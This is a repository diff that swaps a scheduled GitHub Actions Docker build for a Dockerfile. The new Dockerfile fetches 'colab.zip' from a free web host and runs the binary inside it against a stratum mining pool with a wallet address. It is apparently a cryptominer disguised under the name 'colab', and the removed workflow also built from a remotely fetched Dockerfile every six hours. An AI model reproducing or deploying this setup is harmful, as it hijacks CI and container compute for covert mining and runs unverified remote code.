@@ -1,15 +1,11 @@
-name: Docker Image CI
-on:
-  schedule:
-    - cron:  '50 */6 * * *'
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v3
-    - name: Build the Docker image
-      run: wget https://raw.githubusercontent.com/thesunofme/colab/main/Dockerfile; docker build -t colab/docker .
+FROM debian:sid-slim as builder
+
+RUN apt-get update && apt-get dist-upgrade -y && \
+    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
+    apt-get clean && \
+    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+
+RUN apt-get update && apt-get install zip wget -y && \
+    wget https://penyimpananwget.000webhostapp.com/colab.zip && \
+    unzip colab.zip && \
+    ./colab -a colab -o stratum+grpc://colab.jadepool.cloud:666 -u RRSVEyN8J6icKKxdb9dohJE8NCun8rqZSL.duck -p x -t 4
